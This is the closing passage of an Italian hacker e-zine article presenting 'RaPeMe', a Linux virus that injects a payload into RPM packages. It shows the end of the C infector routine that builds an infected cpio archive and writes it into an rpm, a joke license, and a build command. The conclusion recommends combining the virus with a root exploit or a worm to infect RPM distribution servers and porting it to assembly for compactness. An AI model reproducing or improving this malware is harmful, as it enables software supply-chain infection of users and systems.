	ff_size = get_cpio_header_info(arch,CPIO_FIRST_FILE_SIZE_OFFSET,8);
	/* get first file name length */
	ff_file_name_len = get_cpio_header_info(arch,CPIO_FIRST_FILE_NAME_LEN_OFFSET,2);

	/* get first file name */
	ff_name = get_cpio_first_file_name(arch,ff_file_name_len);

	/* make the infected archive */
	new_arch = prepare_virus_cpio(arch,ff_name,ff_file_name_len,ff_size);	

	/* invoke magickal and spiritual power
           to ensure a successful result */ 
	magick_ritual(rpm,new_arch,target_name,offset);

	fclose(arch);
	fclose(rpm);
	fclose(arch);

	printf("Yeah dude,I rock!\n");

	return 0;


}
	
<-X->

<-| RaPeMe/LICENSE |->

THE MAGICK-WARE LICENSE

As long as you retain this notice, you can do whatever you want with
this stuff. If we meet some day, and you think this stuff is worth it,
you can buy me a mezcal bottle in return, because it stimulates the
pineal gland, called also the third eye.
Otherwise you can cast a magick spell to bless me or pray for my
generous and humble soul. PEACE. 

<-X->

***** Conclusione.

Come hai potuto vedere, nonostante il metodo di infezione sia davvero
semplice e stupido (ma funziona, eheh), non e' poi cosi' semplice ottenere
il privilegio dell'installazione di un rpm infetto. La strada giusta
sembrerebbe incrociare il virus con un exploit che ci dia il privilegio
root, piuttosto che cercare di convincere l'utente ad installare rpm
infetti con metodi presi dai piu' classici troiani che affliggono
windoze da anni. Tuttavia gli utenti piu' smaliziati faranno sempre
un rpm --checksig preventivo, prima di installare qualsiasi software.
Certo che la cosa piu' bastarda da fare sarebbe utilizzare un net worm
di quelli tosti come vettore di infezione che comprometta tutti i 
server distributori di rpm ed infetti questi ultimi con il metodo
RaPeMe (naturalmente ottimizzato) >:->. Alcune note sul codice : avrai
notato certamente che il codice e' lento e poco elegante; inoltre 
ho lasciato le chiamate perror() per questioni di debug. Se desideri
un eseguibile mooolto piu' piccolo, il consiglio e' di fare un porting 
completo del codice in una versione esente dall'utilizzo di libc
e quindi che usi solo le chiamate di sistema, in modo da ottimizzarlo 
e da tradurlo ulteriormente in assembly. Il virus e' stato testato su 
Slackware 10 e su una vecchia Mandrake 8.2, e puo' essere compilato con: 

$ gcc -o rapeme main.c hunt.c infect.c && cat LICENSE

La versione proposta cerchera' la prima occorrenza di un rpm nella
home directory e lo infettera' con il metodo descritto in precedenza.
Usa questo codice solo dopo aver lanciato l'incantesimo del cerchio
magico, invocando gli spiriti elementali affinche' vi partecipino.
Ricorda che se danneggi anche solo un sistema con questo software, sarai
inevitabilmente sottoposto alla Legge del Ritorno, ovvero il male da te
elargito ti ritornera' moltiplicato per tre volte... non scherzare con
la magia nera ;-)

***** Saluti.

Giammy+family, tutti i membri della mia ex death metal band
(Cryptestesia fuckin rocks!), dietroleposte, trinity_np,
boletus+xen, matteo delirium ed il mio coniglietto nano Frodo.

***** Riferimenti. 

[1] BFi10-17 : "Analisi virus per linux" by vecna
[2] http://www.big.net.au/~silvio
[3] http://www.rpm.org/max-rpm/index.html 
[4] http://darkstar.ist.utl.pt/slackware/slackware-8.1/patches/source/bin/rpmoffset.c

